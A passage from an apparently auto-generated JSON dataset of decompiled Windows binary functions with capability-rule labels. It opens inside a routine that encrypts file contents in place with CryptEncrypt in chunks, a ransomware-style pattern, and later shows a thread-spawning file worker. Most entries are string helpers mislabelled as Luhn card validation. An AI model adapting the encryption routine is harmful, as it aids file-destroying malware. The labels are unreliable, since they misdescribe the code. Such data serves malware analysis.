var_7ch, var_14h, &fcn.00406886::lpNumberOfBytesWritten, 0);\n            (*pcVar8)(hObject, nNumberOfBytesToRead + var_14h + stack0xffffff98, 0, 0);\n            (*pcVar1)(hObject, var_90h, *0x402034, &fcn.00406886::lpNumberOfBytesWritten, 0);\n        }\n        else {\n            stack0xffffff98 = 0;\n            do {\n                lpBuffer = fcn.0040b859(160000);\n                nNumberOfBytesToWrite = 160000;\n                iVar2 = fcn.00412150(nNumberOfBytesToRead, var_70h, 2, 0, 0, 0);\n                (*pcVar8)(hObject, iVar2 + -1600000 + stack0xffffff98);\n                (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, lpBuffer, 160000, &fcn.00406886::lpNumberOfBytesRead, 0);\n                (*_sym.imp.ADVAPI32.dll_CryptEncrypt)\n                          (phKey, 0, 0, 0, lpBuffer, &fcn.00406886::nNumberOfBytesToWrite, nNumberOfBytesToWrite);\n                iVar2 = fcn.00412150(nNumberOfBytesToRead, var_70h, 2, 0, 0, 0);\n                (*pcVar8)(hObject, iVar2 + -1600000 + stack0xffffff98);\n                (*_sym.imp.KERNEL32.dll_WriteFile)\n                          (hObject, lpBuffer, nNumberOfBytesToWrite, &fcn.00406886::lpNumberOfBytesWritten, 0);\n                fcn.0040d85a(lpBuffer);\n                unique0x00007a00 = stack0xffffff98 + 160000;\n            } while (unique0x00007a00 < 1600000);\n            *NULL = fcn.0040b859(0x19000);\n            noname_4_00 = 0;\n            uVar11 = 0;\n            iVar2 = 0;\n            pdwDataLen = 0x19000;\n            in_stack_fffffed0 = hObject;\n            (*pcVar8)();\n            in_stack_fffffec4 = 0x19000;\n            in_stack_fffffec0 = stack0xffffff98;\n            (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, stack0xffffff98, 0x19000, &fcn.00406886::lpNumberOfBytesRead, 0);\n            (*_sym.imp.ADVAPI32.dll_CryptEncrypt)\n                      (phKey, 0, 0, 0, stack0xffffff98, &fcn.00406886::pdwDataLen, pdwDataLen);\n            (*pcVar8)(hObject, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteFile)\n                      (hObject, stack0xffffff98, pdwDataLen, &fcn.00406886::lpNumberOfBytesWritten, 0);\n            pdwDataLen = 0x19000;\n            (*pcVar8)(hObject, nNumberOfBytesToRead - 0x19000, 0, 0);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, stack0xffffff98, 0x19000, &fcn.00406886::lpNumberOfBytesRead, 0);\n            (*_sym.imp.ADVAPI32.dll_CryptEncrypt)\n                      (phKey, 0, 0, 0, stack0xffffff98, &fcn.00406886::pdwDataLen, pdwDataLen);\n            (*pcVar8)(hObject, nNumberOfBytesToRead - 0x19000, 0, 0);\n            pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n            (*_sym.imp.KERNEL32.dll_WriteFile)\n                      (hObject, stack0xffffff98, pdwDataLen, &fcn.00406886::lpNumberOfBytesWritten, 0);\n            (*pcVar8)(hObject, nNumberOfBytesToRead, 0, 0);\n            (*pcVar1)(hObject, var_7ch, var_14h, &fcn.00406886::lpNumberOfBytesWritten, 0);\n            (*pcVar8)(hObject, nNumberOfBytesToRead + var_14h, 0, 0);\n            (*pcVar1)(hObject, var_90h, *0x402034, &fcn.00406886::lpNumberOfBytesWritten, 0);\n            fcn.0040d85a(stack0xffffff98);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        in_stack_fffffecc = &fcn.00406886::arg_8h;\n        fcn.004071e8(in_stack_fffffecc);\n        in_stack_fffffec8 = 0x406e8a;\n        fcn.004067bd(in_stack_fffffecc, in_stack_fffffed0, iVar2, uVar11, noname_4_00, arg_1ch_00);\n    }\n    fcn.0040d85a(var_90h);\n    fcn.0040d85a(var_7ch);\n    (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(phKey);\n    (*_sym.imp.ADVAPI32.dll_CryptDestroyHash)(hBaseData);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    puVar4 = &fcn.00406886::arg_8h;\n    fcn.004071e8(puVar4);\n    fcn.004067bd(puVar4, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, in_stack_fffffecc, in_stack_fffffed0);\n    uVar11 = 1;\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040748c(1);\n    fcn.0040b864(uVar11);\n    return;\n}\n",
        "token_count": 4159
    },
    "00406f12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406f12(uint *arg_8h)\n\n{\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    fcn.0040720e(arg_8h);\n    fcn.00405915(arg_8h);\n    return 0;\n}\n",
        "token_count": 77
    },
    "00406f3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406f3d(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint lpHandles;\n    int32_t var_24h;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar3 = 0;\n    if ((*0x4147a8 - *0x4147a4) / 0x1c != 0) {\n        var_24h = 0;\n        do {\n            fcn.0040b44d(&var_20h);\n            puVar1 = var_20h;\n            if (var_ch < 8) {\n                puVar1 = &var_20h;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00406f12, puVar1, 0, 0);\n            (&lpHandles)[uVar3] = uVar2;\n            (*_sym.imp.KERNEL32.dll_Sleep)(200);\n            fcn.0040748c(1);\n            var_24h = var_24h + 0x1c;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < (*0x4147a8 - *0x4147a4) / 0x1c);\n    }\n    uVar2 = 0xffffffff;\n    (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)((*0x4147a8 - *0x4147a4) / 0x1c, &lpHandles, 1);\n    fcn.0040b864(uVar2);\n    return;\n}\n",
        "token_count": 398
    },
    "004070cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004070cc(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0040b7eb(0x40453c);\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.0040be70(puVar4 + param_1, puVar2 + in_EAX + param_1, uVar3 - in_EAX);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX)) = 0;\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "0040723c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040723c(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    uint32_t *unaff_EDI;\n    \n    uVar1 = unaff_EDI[1];\n    if ((in_EAX < uVar1) && (uVar2 = *unaff_EDI,  uVar2 <= in_EAX)) {\n        if (uVar1 == unaff_EDI[2]) {\n            fcn.004074cc();\n        }\n        if (unaff_EDI[1] == 0) goto code_r0x0040728a;\n        in_EAX = ((in_EAX - uVar2) / 0x1c) * 0x1c + *unaff_EDI;\n    }\n    else {\n        if (uVar1 == unaff_EDI[2]) {\n            fcn.004074cc();\n        }\n        if (unaff_EDI[1] == 0) goto code_r0x0040728a;\n    }\n    fcn.00407008(in_EAX);\ncode_r0x0040728a:\n    unaff_EDI[1] = unaff_EDI[1] + 0x1c;\n    return;\n}\n",
        "token_count": 278
    },
    "00407291": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407291(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.0040571f(1);\n        if (unaff_EBX[5] < 0x10) {\n            fcn.0040be70(in_EAX, unaff_EBX, unaff_EBX[4] + 1);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "004072d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004072d6(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t arg_10h;\n    \n    uVar2 = in_EAX[4];\n    uVar3 = arg_8h;\n    if (uVar2 < arg_8h) {\n        uVar2 = fcn.0040b7eb(0x40453c);\n        uVar3 = extraout_ECX;\n    }\n    arg_10h = uVar2 - uVar3;\n    if (arg_ch < uVar2 - uVar3) {\n        arg_10h = arg_ch;\n    }\n    if (in_ECX == in_EAX) {\n        fcn.004070cc();\n        fcn.004070cc();\n    }\n    else {\n        cVar1 = fcn.004075c0(0);\n        if (cVar1 != '\\0') {\n            if (0xf < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.0040b880(arg_8h_00, in_EAX + arg_8h, arg_10h);\n            in_ECX[4] = arg_10h;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + arg_10h) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "00407365": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407365(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *in_ECX;\n    uint32_t unaff_EDI;\n    \n    if (in_ECX[4] < in_EAX) {\n        in_EAX = in_ECX[4];\n    }\n    uVar1 = in_EAX;\n    if (unaff_EDI <= in_EAX) {\n        uVar1 = unaff_EDI;\n    }\n    if (0xf < in_ECX[5]) {\n        in_ECX = *in_ECX;\n    }\n    uVar1 = fcn.0040c1d1(in_ECX, arg_8h, uVar1);\n    if (uVar1 == 0) {\n        if (in_EAX < unaff_EDI) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            uVar1 = in_EAX != unaff_EDI;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 229
    },
    "004073aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004073aa(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.0040748c(1);\n        if (unaff_EBX[5] < 8) {\n            fcn.0040be70(in_EAX, unaff_EBX, unaff_EBX[4] * 2 + 2);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004073f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004073f2(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    \n    uVar3 = in_EAX[4];\n    uVar2 = arg_8h;\n    if (uVar3 < arg_8h) {\n        uVar2 = fcn.0040b7eb(0x40453c);\n    }\n    uVar3 = uVar3 - uVar2;\n    if (arg_ch < uVar3) {\n        uVar3 = arg_ch;\n    }\n    if (in_ECX == in_EAX) {\n        fcn.004076a2();\n        fcn.004076a2();\n    }\n    else {\n        cVar1 = fcn.00407713(0);\n        if (cVar1 != '\\0') {\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = in_ECX;\n            if (7 < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.0040b880(arg_8h_00, in_EAX + arg_8h * 2, uVar3 * 2);\n            in_ECX[4] = uVar3;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(uVar3 * 2 + in_ECX) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00407523": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407523(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *arg_8h;\n    uint *unaff_ESI;\n    \n    cVar1 = fcn.0040793c(param_1);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004075c0(0);\n        if (cVar1 != '\\0') {\n            arg_8h = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                arg_8h = *unaff_ESI;\n            }\n            fcn.0040b880(arg_8h, param_1, in_EAX);\n            unaff_ESI[4] = in_EAX;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + in_EAX) = 0;\n        }\n    }\n    else {\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        fcn.004072d6(param_1 - unaff_ESI, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00407627": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407627(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *arg_8h;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    cVar1 = fcn.00407a65(param_1);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00407713(0);\n        if (cVar1 != '\\0') {\n            arg_8h = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                arg_8h = *unaff_ESI;\n            }\n            fcn.0040b880(arg_8h, param_1, in_EAX * 2);\n            unaff_ESI[4] = in_EAX;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(in_EAX * 2 + unaff_ESI) = 0;\n        }\n    }\n    else {\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        fcn.004073f2(param_1 - unaff_ESI >> 1, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "004076a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004076a2(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0040b7eb(0x40453c);\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (7 < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.0040be70(puVar4 + param_1 * 2, puVar2 + (param_1 + in_EAX) * 2, (uVar3 - in_EAX) * 2);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "0040777f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0040777f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004120fc(0x14);\n    uVar4 = *(unaff_EBP + 8);\n    if (0x9249249 < uVar4) {\n        fcn.0040b79e(0x404564);\n    }\n    if ((extraout_ECX[2] - *extraout_ECX) / 0x1c < uVar4) {\n        uVar2 = fcn.00407aa1();\n        *(unaff_EBP + -0x18) = uVar2;\n        *(unaff_EBP + -4) = 0;\n        fcn.0040816a(*extraout_ECX, extraout_ECX[1], *(unaff_EBP + -0x18));\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar3 = extraout_ECX[1];\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar1 = *extraout_ECX;\n        iVar3 = (iVar3 - iVar1) / 0x1c;\n        *(unaff_EBP + -0x20) = iVar3;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -0x14) = iVar1;\n            if (iVar1 != *(unaff_EBP + -0x1c)) {\n                do {\n                    fcn.0040571f(1);\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x1c;\n                } while (*(unaff_EBP + -0x14) != *(unaff_EBP + -0x1c));\n                uVar4 = *(unaff_EBP + 8);\n                iVar3 = *(unaff_EBP + -0x20);\n            }\n            fcn.0040bd1b(*extraout_ECX);\n        }\n        iVar1 = *(unaff_EBP + -0x18);\n        extraout_ECX[2] = uVar4 * 0x1c + iVar1;\n        extraout_ECX[1] = iVar3 * 0x1c + iVar1;\n        *extraout_ECX = iVar1;\n    }\n    fcn.00412132();\n    return;\n}\n",
        "token_count": 629
    },
    "00407b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407b7c(uint arg_8h)\n\n{\n    uint in_EAX;\n    ushort *in_ECX;\n    \n    *(in_ECX + 8) = 0;\n    *(in_ECX + 10) = 7;\n    *in_ECX = 0;\n    fcn.0040d7bb(arg_8h);\n    fcn.00407ce5();\n    fcn.00407f37(in_EAX, 0);\n    fcn.0040d7bb(arg_8h);\n    fcn.00407fd4(arg_8h);\n    return;\n}\n",
        "token_count": 137
    },
    "00407d1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d1a(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0040b7eb(0x40453c);\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.0040b79e(0x404554);\n    }\n    if (in_EAX != 0) {\n        cVar1 = fcn.004075c0(0);\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.0040b880(unaff_ESI[4] + puVar4, arg_8h + arg_ch, in_EAX);\n            unaff_ESI[4] = iVar3 + in_EAX;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar3 + in_EAX) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "00407dae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407dae(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.0040793c(arg_8h);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0040b79e(0x404554);\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.004075c0(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.0040b880(in_EAX[4] + puVar3, arg_8h, unaff_EDI);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2 + unaff_EDI) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.00407d1a(in_EAX, arg_8h - puVar3);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00407e3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e3e(uint *arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *unaff_ESI;\n    \n    if (arg_ch <= arg_8h[4]) {\n        uVar3 = arg_8h[4] - arg_ch;\n        if (uVar3 < in_EAX) {\n            in_EAX = uVar3;\n        }\n        iVar4 = unaff_ESI[4];\n        if (-iVar4 - 1U <= in_EAX) {\n            iVar4 = fcn.0040b79e(0x404554);\n        }\n        if (in_EAX != 0) {\n            cVar2 = fcn.004075c0(0);\n            if (cVar2 != '\\0') {\n                puVar5 = unaff_ESI;\n                puVar6 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar5 = *unaff_ESI;\n                    puVar6 = *unaff_ESI;\n                }\n                fcn.0040be70(puVar5 + in_EAX, puVar6, unaff_ESI[4]);\n                if (unaff_ESI == arg_8h) {\n                    uVar3 = arg_ch + in_EAX;\n                    if (arg_ch == 0) {\n                        uVar3 = arg_ch;\n                    }\n                    puVar5 = unaff_ESI;\n                    puVar6 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar5 = *unaff_ESI;\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.0040be70(puVar5, puVar6 + uVar3, in_EAX);\n                }\n                else {\n                    if (0xf < arg_8h[5]) {\n                        arg_8h = *arg_8h;\n                    }\n                    puVar6 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.0040b880(puVar6, arg_8h + arg_ch, in_EAX);\n                }\n                unaff_ESI[4] = iVar4 + in_EAX;\n                if (0xf < unaff_ESI[5]) {\n                    unaff_ESI = *unaff_ESI;\n                }\n                *(unaff_ESI + iVar4 + in_EAX) = 0;\n            }\n        }\n        return;\n    }\n    fcn.0040b7eb(0x40453c);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 640
    },
    "00407f37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f37(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0040b7eb(0x40453c);\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.0040b79e(0x404554);\n    }\n    if (in_EAX != 0) {\n        cVar1 = fcn.00407713(0);\n        if (cVar1 != '\\0') {\n            if (7 < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.0040b880(puVar4 + unaff_ESI[4] * 2, arg_8h + arg_ch * 2, in_EAX * 2);\n            unaff_ESI[4] = iVar3 + in_EAX;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + (iVar3 + in_EAX) * 2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 405
    },
    "00407fd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407fd4(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.00407a65(arg_8h);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.0040b79e(0x404554);\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.00407713(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (7 < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.0040b880(puVar3 + in_EAX[4] * 2, arg_8h, unaff_EDI * 2);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (7 < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + (iVar2 + unaff_EDI) * 2) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.00407f37(in_EAX, arg_8h - puVar3 >> 1);\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "0040816a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040816a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004120fc(8);\n    iVar2 = *(unaff_EBP + 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -4) = 0;\n    while (iVar1 != *(unaff_EBP + 0xc)) {\n        if (iVar2 != 0) {\n            fcn.00407058();\n        }\n        iVar2 = iVar2 + 0x1c;\n        *(unaff_EBP + 0x10) = iVar2;\n        iVar1 = iVar1 + 0x1c;\n        *(unaff_EBP + 8) = iVar1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00412132();\n    return;\n}\n",
        "token_count": 256
    },
    "004087b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004087b2(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint32_t *unaff_ESI;\n    \n    puVar2 = unaff_ESI[1];\n    if ((in_EAX < puVar2) && (puVar1 = *unaff_ESI,  puVar1 <= in_EAX)) {\n        if (puVar2 == unaff_ESI[2]) {\n            fcn.00408847();\n        }\n        puVar2 = unaff_ESI[1];\n        if (puVar2 == NULL) goto code_r0x004087f8;\n        uVar3 = *(*unaff_ESI + (in_EAX - puVar1 >> 2) * 4);\n    }\n    else {\n        if (puVar2 == unaff_ESI[2]) {\n            fcn.00408847();\n        }\n        puVar2 = unaff_ESI[1];\n        if (puVar2 == NULL) goto code_r0x004087f8;\n        uVar3 = *in_EAX;\n    }\n    *puVar2 = uVar3;\ncode_r0x004087f8:\n    unaff_ESI[1] = unaff_ESI[1] + 4;\n    return;\n}\n",
        "token_count": 294
    },
    "00408978": {
        "rules": [
